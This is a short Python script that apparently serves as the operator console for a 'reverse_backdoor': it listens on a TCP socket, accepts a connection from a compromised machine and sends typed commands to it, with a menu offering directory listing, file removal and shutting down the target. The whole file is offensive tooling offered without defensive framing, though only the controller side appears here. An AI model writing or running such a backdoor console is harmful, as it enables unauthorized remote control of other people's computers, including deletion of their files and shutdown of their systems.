import socket
import os
print('Command Line start while "===>"')
sc=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sc.bind(('127.0.1.1',110))
sc.listen(1)
c,a =sc.accept()
print ('Warning: please except sending no command,or script will be break!')
print ('Press Ctrl+c to exit')
commandlist='''
use_cwd: Current directory
use_ls: list directory and files
use_cd: Change directory
use_shutdown: Shutdown Target
use_cls: clear screen
use_sp: System printer
use_mkd: Make new directory
use_rm: Remove files
exit: exit reverse_backdoor
'''
print (commandlist)
while (1):
    try:
       cmd=input('===>')
       data=c.send(cmd.encode())
       re=c.recv(5000)
       re=re.decode()
       print (re)
    except KeyboardInterrupt:
       print ('Leaving.....')
       exit()
